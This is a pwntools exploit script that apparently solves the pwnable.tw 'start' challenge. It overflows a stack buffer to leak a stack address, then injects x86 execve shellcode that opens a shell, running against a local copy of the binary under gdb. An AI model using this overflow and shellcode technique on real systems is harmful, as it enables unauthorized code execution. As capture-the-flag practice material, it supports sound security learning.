#! /usr/bin/env python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

#p = remote("chall.pwnable.tw", 10000)
shellcode = b"j\x0bX\x99RYhsh\x00\x00T[\xcd\x80"
addr_ii = 0x080480a0
addr_xii = 0x0804809e
addr_eedmi = 0x08048091
addr_mi = 0x0804808d
addr_ret = 0x0804809c
addr_aret = 0x08048099
addr_ecx = 0x08048090
addr_ecx2 = 0x08048087
p = process("./start")
gdb.attach(p, 'b _start')
p.recv()
#payload = shellcode + b"A"*(0x14 - len(shellcode))
payload = b"A"*(0x14)
payload += p32(addr_ecx2)
p.send(payload)
x = p.recv()
addr_stack = u32(x[0:4]) - 4
p2 = shellcode + b"A"*(0x14 - len(shellcode))
p2 += p32(addr_stack)
p.send(p2)
p.interactive()
